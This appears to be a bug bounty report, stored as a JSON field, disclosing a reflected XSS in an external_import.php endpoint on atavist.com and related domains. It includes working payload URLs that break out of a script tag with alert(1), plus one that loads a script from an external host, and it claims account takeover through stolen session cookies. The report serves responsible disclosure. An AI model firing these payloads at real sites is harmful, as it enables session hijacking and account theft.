  "content": "\nSummary:\nHi team,\nI found this php file https://magazine.atavist.com/static/external_import.php , and there is a parameter called scripts on this php file.\nBasically, the endpoint prints value of scripts parameter to <script src='$Value'>.\nSo we can import any script file like that : https://magazine.atavist.com/static/external_import.php?scripts=//15.rs\nOr we can write HTML tags too, there is no encoding : https://magazine.atavist.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E\nThis endpoint is also available on other websites. Like :\nhttps://docs.atavist.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E\nhttp://www.377union.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E\nAlso there is no secure flag on the session cookie (periodicSessionatavist). So this XSS leads to account takeover.\nImpact\nReflected XSS - account takeover via cookie stealing\nThanks,\nBugra\n\n",
